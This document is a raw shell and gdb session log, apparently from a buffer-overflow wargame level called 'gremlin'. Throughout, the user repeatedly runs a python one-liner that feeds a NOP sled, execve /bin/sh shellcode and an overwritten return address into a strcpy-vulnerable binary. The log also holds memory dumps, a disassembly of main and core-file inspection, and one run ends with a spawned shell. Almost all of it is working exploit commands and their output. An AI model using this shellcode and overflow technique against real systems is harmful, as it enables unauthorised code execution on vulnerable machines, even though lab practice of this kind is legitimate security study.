0xbffffb10:	0x0e	0x00	0x00	0x00	0xf4	0x01	0x00	0x00
0xbffffb18:	0x10	0x00	0x00	0x00	0xff	0xfb	0xab	0x0f
0xbffffb20:	0x0f	0x00	0x00	0x00	0x4d	0xfb	0xff	0xbf
0xbffffb28:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xbffffb30:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xbffffb38:	0x00	0x00	0x00	0x00
(gdb) 
0xbffffb3c:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xbffffb44:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xbffffb4c:	0x00	0x69	0x36	0x38	0x36	0x00	0x2e	0x2f
0xbffffb54:	0x67	0x72	0x65	0x6d	0x6c	0x69	0x6e	0x00
0xbffffb5c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffb64:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffb6c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffb74:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffb7c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffb84:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffb8c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffb94:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffb9c:	0x90	0x90	0x90	0x90
(gdb) 
0xbffffba0:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffba8:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffbb0:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffbb8:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffbc0:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffbc8:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffbd0:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffbd8:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffbe0:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffbe8:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffbf0:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffbf8:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffc00:	0x90	0x90	0x90	0x90
(gdb) 
0xbffffc04:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffc0c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffc14:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffc1c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffc24:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffc2c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffc34:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffc3c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x31
0xbffffc44:	0xc0	0x50	0x68	0x2f	0x2f	0x73	0x68	0x68
0xbffffc4c:	0x2f	0x62	0x69	0x6e	0x89	0xe3	0x50	0x53
0xbffffc54:	0x89	0xe1	0x89	0xc2	0xb0	0x0b	0xcd	0x80
0xbffffc5c:	0xff	0xff	0xff	0xbf	0x38	0xf8	0xff	0xbf
0xbffffc64:	0x00	0x50	0x57	0x44
(gdb) 
0xbffffc68:	0x3d	0x2f	0x68	0x6f	0x6d	0x65	0x2f	0x67
0xbffffc70:	0x61	0x74	0x65	0x2f	0x74	0x65	0x6d	0x70
0xbffffc78:	0x00	0x52	0x45	0x4d	0x4f	0x54	0x45	0x48
0xbffffc80:	0x4f	0x53	0x54	0x3d	0x31	0x39	0x32	0x2e
0xbffffc88:	0x31	0x36	0x38	0x2e	0x32	0x33	0x35	0x2e
0xbffffc90:	0x31	0x00	0x48	0x4f	0x53	0x54	0x4e	0x41
0xbffffc98:	0x4d	0x45	0x3d	0x6c	0x6f	0x63	0x61	0x6c
0xbffffca0:	0x68	0x6f	0x73	0x74	0x2e	0x6c	0x6f	0x63
0xbffffca8:	0x61	0x6c	0x64	0x6f	0x6d	0x61	0x69	0x6e
0xbffffcb0:	0x00	0x4c	0x45	0x53	0x53	0x4f	0x50	0x45
0xbffffcb8:	0x4e	0x3d	0x7c	0x2f	0x75	0x73	0x72	0x2f
0xbffffcc0:	0x62	0x69	0x6e	0x2f	0x6c	0x65	0x73	0x73
0xbffffcc8:	0x70	0x69	0x70	0x65
(gdb) 
0xbffffccc:	0x2e	0x73	0x68	0x20	0x25	0x73	0x00	0x55
0xbffffcd4:	0x53	0x45	0x52	0x3d	0x67	0x61	0x74	0x65
0xbffffcdc:	0x00	0x4c	0x53	0x5f	0x43	0x4f	0x4c	0x4f
0xbffffce4:	0x52	0x53	0x3d	0x6e	0x6f	0x3d	0x30	0x30
0xbffffcec:	0x3a	0x66	0x69	0x3d	0x30	0x30	0x3a	0x64
0xbffffcf4:	0x69	0x3d	0x30	0x31	0x3b	0x33	0x34	0x3a
0xbffffcfc:	0x6c	0x6e	0x3d	0x30	0x31	0x3b	0x33	0x36
0xbffffd04:	0x3a	0x70	0x69	0x3d	0x34	0x30	0x3b	0x33
0xbffffd0c:	0x33	0x3a	0x73	0x6f	0x3d	0x30	0x31	0x3b
0xbffffd14:	0x33	0x35	0x3a	0x62	0x64	0x3d	0x34	0x30
0xbffffd1c:	0x3b	0x33	0x33	0x3b	0x30	0x31	0x3a	0x63
0xbffffd24:	0x64	0x3d	0x34	0x30	0x3b	0x33	0x33	0x3b
0xbffffd2c:	0x30	0x31	0x3a	0x6f
(gdb) 
0xbffffd30:	0x72	0x3d	0x30	0x31	0x3b	0x30	0x35	0x3b
0xbffffd38:	0x33	0x37	0x3b	0x34	0x31	0x3a	0x6d	0x69
0xbffffd40:	0x3d	0x30	0x31	0x3b	0x30	0x35	0x3b	0x33
0xbffffd48:	0x37	0x3b	0x34	0x31	0x3a	0x65	0x78	0x3d
0xbffffd50:	0x30	0x31	0x3b	0x33	0x32	0x3a	0x2a	0x2e
0xbffffd58:	0x63	0x6d	0x64	0x3d	0x30	0x31	0x3b	0x33
0xbffffd60:	0x32	0x3a	0x2a	0x2e	0x65	0x78	0x65	0x3d
0xbffffd68:	0x30	0x31	0x3b	0x33	0x32	0x3a	0x2a	0x2e
0xbffffd70:	0x63	0x6f	0x6d	0x3d	0x30	0x31	0x3b	0x33
0xbffffd78:	0x32	0x3a	0x2a	0x2e	0x62	0x74	0x6d	0x3d
0xbffffd80:	0x30	0x31	0x3b	0x33	0x32	0x3a	0x2a	0x2e
0xbffffd88:	0x62	0x61	0x74	0x3d	0x30	0x31	0x3b	0x33
0xbffffd90:	0x32	0x3a	0x2a	0x2e
(gdb) 
0xbffffd94:	0x73	0x68	0x3d	0x30	0x31	0x3b	0x33	0x32
0xbffffd9c:	0x3a	0x2a	0x2e	0x63	0x73	0x68	0x3d	0x30
0xbffffda4:	0x31	0x3b	0x33	0x32	0x3a	0x2a	0x2e	0x74
0xbffffdac:	0x61	0x72	0x3d	0x30	0x31	0x3b	0x33	0x31
0xbffffdb4:	0x3a	0x2a	0x2e	0x74	0x67	0x7a	0x3d	0x30
0xbffffdbc:	0x31	0x3b	0x33	0x31	0x3a	0x2a	0x2e	0x61
0xbffffdc4:	0x72	0x6a	0x3d	0x30	0x31	0x3b	0x33	0x31
0xbffffdcc:	0x3a	0x2a	0x2e	0x74	0x61	0x7a	0x3d	0x30
0xbffffdd4:	0x31	0x3b	0x33	0x31	0x3a	0x2a	0x2e	0x6c
0xbffffddc:	0x7a	0x68	0x3d	0x30	0x31	0x3b	0x33	0x31
0xbffffde4:	0x3a	0x2a	0x2e	0x7a	0x69	0x70	0x3d	0x30
0xbffffdec:	0x31	0x3b	0x33	0x31	0x3a	0x2a	0x2e	0x7a
0xbffffdf4:	0x3d	0x30	0x31	0x3b
(gdb) q
[gate@localhost temp]$ ./gremlin `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x5c\xfc\xff\xbf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿\
Illegal instruction (core dumped)
[gate@localhost temp]$ ./gremlin `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x40\xfc\xff\xbf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿@
bash$ ls
core  gremlin  gremlin.c  pay.txt  re.txt
bash$ q
sh: q: command not found
bash$ exit
exit
[gate@localhost temp]$ 
[gate@localhost temp]$ 
[gate@localhost temp]$ 
[gate@localhost temp]$ cd..
bash2: cd..: command not found
[gate@localhost temp]$ ls
core  gremlin  gremlin.c  pay.txt  re.txt
[gate@localhost temp]$ cd ..
[gate@localhost gate]$ s
bash2: s: command not found
[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x40\xfc\xff\xbf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿@
Illegal instruction
[gate@localhost gate]$ ls
asdf  asdf.c  gremlim  gremlin  gremlin.c  temp
[gate@localhost gate]$ q
bash2: q: command not found
[gate@localhost gate]$ 
[gate@localhost gate]$ 
[gate@localhost gate]$ 
[gate@localhost gate]$ 
[gate@localhost gate]$ 
[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x40\xfc\xff\xbf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿@
Illegal instruction
[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x4c\xfc\xff\xbf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿L
Illegal instruction
[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\xdd\xfc\xff\xbf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿޼ÿ¿
Segmentation fault
[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\xdd\xfc\xff\xbf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿޼ÿ¿
Segmentation fault
[gate@localhost gate]$ gdb gremlin
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux"...
(gdb) ls
Undefined command: "ls".  Try "help".
(gdb) disas main
Dump of assembler code for function main:
0x8048430 <main>:	push   %ebp
0x8048431 <main+1>:	mov    %esp,%ebp
0x8048433 <main+3>:	sub    $0x100,%esp
0x8048439 <main+9>:	cmpl   $0x1,0x8(%ebp)
0x804843d <main+13>:	jg     0x8048456 <main+38>
0x804843f <main+15>:	push   $0x80484e0
0x8048444 <main+20>:	call   0x8048350 <printf>
0x8048449 <main+25>:	add    $0x4,%esp
0x804844c <main+28>:	push   $0x0
0x804844e <main+30>:	call   0x8048360 <exit>
0x8048453 <main+35>:	add    $0x4,%esp
0x8048456 <main+38>:	mov    0xc(%ebp),%eax
0x8048459 <main+41>:	add    $0x4,%eax
0x804845c <main+44>:	mov    (%eax),%edx
0x804845e <main+46>:	push   %edx
0x804845f <main+47>:	lea    0xffffff00(%ebp),%eax
0x8048465 <main+53>:	push   %eax
0x8048466 <main+54>:	call   0x8048370 <strcpy>
0x804846b <main+59>:	add    $0x8,%esp
0x804846e <main+62>:	lea    0xffffff00(%ebp),%eax
0x8048474 <main+68>:	push   %eax
0x8048475 <main+69>:	push   $0x80484ec
0x804847a <main+74>:	call   0x8048350 <printf>
0x804847f <main+79>:	add    $0x8,%esp
0x8048482 <main+82>:	leave  
0x8048483 <main+83>:	ret    
0x8048484 <main+84>:	nop    
0x8048485 <main+85>:	nop    
0x8048486 <main+86>:	nop    
0x8048487 <main+87>:	nop    
0x8048488 <main+88>:	nop    
0x8048489 <main+89>:	nop    
0x804848a <main+90>:	nop    
0x804848b <main+91>:	nop    
0x804848c <main+92>:	nop    
0x804848d <main+93>:	nop    
0x804848e <main+94>:	nop    
0x804848f <main+95>:	nop    
End of assembler dump.
(gdb) q
[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x40\xfc\xff\xbf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿@
Illegal instruction
[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x40\xfc\xff\xbf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿@
Illegal instruction
[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x40\xfc\xff\xbf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿@
Illegal instruction
[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x40\xfc\xff\xbf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿@
Illegal instruction
[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x40\xfc\xff\xbf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿@
Illegal instruction
[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x40\xfc\xff\xbf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿@
Illegal instruction
[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x40\xfc\xff\xbf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿@
Illegal instruction
[gate@localhost gate]$ 
[gate@localhost gate]$ 
[gate@localhost gate]$ 
[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x4c\xfc\xff\xbf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿L
Illegal instruction
[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x4c\xfc\xff\xcf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿L
Segmentation fault
[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x4c\xfc\xff\xaf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿L
Segmentation fault
[gate@localhost gate]$ ls
asdf  asdf.c  gremlim  gremlin  gremlin.c  temp
[gate@localhost gate]$ ./gremlim `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x4c\xfc\xff\xaf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿L
Segmentation fault (core dumped)
[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x40\xfc\xff\xbf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿@
Illegal instruction
[gate@localhost gate]$ ./gremlim `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x40\xfc\xff\xbf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿@
Illegal instruction (core dumped)
[gate@localhost gate]$ gdb -c core 
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux".
Core was generated by `./gremlim '.
Program terminated with signal 4, Illegal instruction.
#0  0xbffffc4a in ?? ()
(gdb) x/100 $esp
0xbffff9e8:	0x401081ec	0x00000109	0x00000000	0xbffffa34
0xbffff9f8:	0xbffffa40	0x40013868	0x00000002	0x08048380
0xbffffa08:	0x00000000	0x080483a1	0x08048430	0x00000002
0xbffffa18:	0xbffffa34	0x080482e0	0x080484bc	0x4000ae60
0xbffffa28:	0xbffffa2c	0x40013e90	0x00000002	0xbffffb40
0xbffffa38:	0xbffffb4a	0x00000000	0xbffffc53	0xbffffc62
0xbffffa48:	0xbffffc7b	0xbffffc9a	0xbffffcbc	0xbffffcc6
0xbffffa58:	0xbffffe89	0xbffffea8	0xbffffec2	0xbffffed7
0xbffffa68:	0xbffffef3	0xbffffefe	0xbfffff18	0xbfffff25
0xbffffa78:	0xbfffff2d	0xbfffff37	0xbfffff47	0xbfffff55
0xbffffa88:	0xbfffff63	0xbfffff74	0xbfffff7f	0xbfffff8f
0xbffffa98:	0xbfffffcf	0xbfffffdb	0x00000000	0x00000003
0xbffffaa8:	0x08048034	0x00000004	0x00000020	0x00000005
0xbffffab8:	0x00000006	0x00000006	0x00001000	0x00000007
0xbffffac8:	0x40000000	0x00000008	0x00000000	0x00000009
0xbffffad8:	0x08048380	0x0000000b	0x000001f4	0x0000000c
0xbffffae8:	0x000001f4	0x0000000d	0x000001f4	0x0000000e
0xbffffaf8:	0x000001f4	0x00000010	0x0fabfbff	0x0000000f
0xbffffb08:	0xbffffb3b	0x00000000	0x00000000	0x00000000
0xbffffb18:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffb28:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffb38:	0x69000000	0x00363836	0x72672f2e	0x696c6d65
0xbffffb48:	0x9090006d	0x90909090	0x90909090	0x90909090
0xbffffb58:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffb68:	0x90909090	0x90909090	0x90909090	0x90909090
(gdb) 
0xbffffb78:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffb88:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffb98:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffba8:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbb8:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbc8:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbd8:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbe8:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbf8:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc08:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc18:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc28:	0x90909090	0x90909090	0x50c03190	0x732f2f68
0xbffffc38:	0x622f6868	0xe3896e69	0xe1895350	0x0bb0c289
0xbffffc48:	0xffff80cd	0xfc40bfff	0x5000bfff	0x2f3d4457
0xbffffc58:	0x656d6f68	0x7461672f	0x45520065	0x45544f4d
0xbffffc68:	0x54534f48	0x3239313d	0x3836312e	0x3533322e
0xbffffc78:	0x4800312e	0x4e54534f	0x3d454d41	0x61636f6c
0xbffffc88:	0x736f686c	0x6f6c2e74	0x646c6163	0x69616d6f
0xbffffc98:	0x454c006e	0x504f5353	0x7c3d4e45	0x7273752f
0xbffffca8:	0x6e69622f	0x73656c2f	0x70697073	0x68732e65
0xbffffcb8:	0x00732520	0x52455355	0x7461673d	0x534c0065
0xbffffcc8:	0x4c4f435f	0x3d53524f	0x303d6f6e	0x69663a30
0xbffffcd8:	0x3a30303d	0x303d6964	0x34333b31	0x3d6e6c3a
0xbffffce8:	0x333b3130	0x69703a36	0x3b30343d	0x733a3333
0xbffffcf8:	0x31303d6f	0x3a35333b	0x343d6462	0x33333b30
(gdb) x/100n $esp
0xbffff9e8:	Undefined output format "n".
(gdb) x/100b $esp
0xbffff9e8:	0xec	0x81	0x10	0x40	0x09	0x01	0x00	0x00
0xbffff9f0:	0x00	0x00	0x00	0x00	0x34	0xfa	0xff	0xbf
0xbffff9f8:	0x40	0xfa	0xff	0xbf	0x68	0x38	0x01	0x40
0xbffffa00:	0x02	0x00	0x00	0x00	0x80	0x83	0x04	0x08
0xbffffa08:	0x00	0x00	0x00	0x00	0xa1	0x83	0x04	0x08
0xbffffa10:	0x30	0x84	0x04	0x08	0x02	0x00	0x00	0x00
0xbffffa18:	0x34	0xfa	0xff	0xbf	0xe0	0x82	0x04	0x08
0xbffffa20:	0xbc	0x84	0x04	0x08	0x60	0xae	0x00	0x40
0xbffffa28:	0x2c	0xfa	0xff	0xbf	0x90	0x3e	0x01	0x40
0xbffffa30:	0x02	0x00	0x00	0x00	0x40	0xfb	0xff	0xbf
0xbffffa38:	0x4a	0xfb	0xff	0xbf	0x00	0x00	0x00	0x00
0xbffffa40:	0x53	0xfc	0xff	0xbf	0x62	0xfc	0xff	0xbf
0xbffffa48:	0x7b	0xfc	0xff	0xbf
(gdb) 
0xbffffa4c:	0x9a	0xfc	0xff	0xbf	0xbc	0xfc	0xff	0xbf
0xbffffa54:	0xc6	0xfc	0xff	0xbf	0x89	0xfe	0xff	0xbf
0xbffffa5c:	0xa8	0xfe	0xff	0xbf	0xc2	0xfe	0xff	0xbf
0xbffffa64:	0xd7	0xfe	0xff	0xbf	0xf3	0xfe	0xff	0xbf
0xbffffa6c:	0xfe	0xfe	0xff	0xbf	0x18	0xff	0xff	0xbf
0xbffffa74:	0x25	0xff	0xff	0xbf	0x2d	0xff	0xff	0xbf
0xbffffa7c:	0x37	0xff	0xff	0xbf	0x47	0xff	0xff	0xbf
0xbffffa84:	0x55	0xff	0xff	0xbf	0x63	0xff	0xff	0xbf
0xbffffa8c:	0x74	0xff	0xff	0xbf	0x7f	0xff	0xff	0xbf
0xbffffa94:	0x8f	0xff	0xff	0xbf	0xcf	0xff	0xff	0xbf
0xbffffa9c:	0xdb	0xff	0xff	0xbf	0x00	0x00	0x00	0x00
0xbffffaa4:	0x03	0x00	0x00	0x00	0x34	0x80	0x04	0x08
0xbffffaac:	0x04	0x00	0x00	0x00
(gdb) 
0xbffffab0:	0x20	0x00	0x00	0x00	0x05	0x00	0x00	0x00
0xbffffab8:	0x06	0x00	0x00	0x00	0x06	0x00	0x00	0x00
0xbffffac0:	0x00	0x10	0x00	0x00	0x07	0x00	0x00	0x00
0xbffffac8:	0x00	0x00	0x00	0x40	0x08	0x00	0x00	0x00
0xbffffad0:	0x00	0x00	0x00	0x00	0x09	0x00	0x00	0x00
0xbffffad8:	0x80	0x83	0x04	0x08	0x0b	0x00	0x00	0x00
0xbffffae0:	0xf4	0x01	0x00	0x00	0x0c	0x00	0x00	0x00
0xbffffae8:	0xf4	0x01	0x00	0x00	0x0d	0x00	0x00	0x00
0xbffffaf0:	0xf4	0x01	0x00	0x00	0x0e	0x00	0x00	0x00
0xbffffaf8:	0xf4	0x01	0x00	0x00	0x10	0x00	0x00	0x00
0xbffffb00:	0xff	0xfb	0xab	0x0f	0x0f	0x00	0x00	0x00
0xbffffb08:	0x3b	0xfb	0xff	0xbf	0x00	0x00	0x00	0x00
0xbffffb10:	0x00	0x00	0x00	0x00
(gdb) 
0xbffffb14:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xbffffb1c:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xbffffb24:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xbffffb2c:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xbffffb34:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x69
0xbffffb3c:	0x36	0x38	0x36	0x00	0x2e	0x2f	0x67	0x72
0xbffffb44:	0x65	0x6d	0x6c	0x69	0x6d	0x00	0x90	0x90
0xbffffb4c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffb54:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffb5c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffb64:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffb6c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffb74:	0x90	0x90	0x90	0x90
(gdb) 
0xbffffb78:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffb80:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffb88:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffb90:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffb98:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffba0:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffba8:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffbb0:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffbb8:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffbc0:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffbc8:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffbd0:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffbd8:	0x90	0x90	0x90	0x90
(gdb) 
0xbffffbdc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffbe4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffbec:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffbf4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffbfc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffc04:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffc0c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffc14:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffc1c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffffc24:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
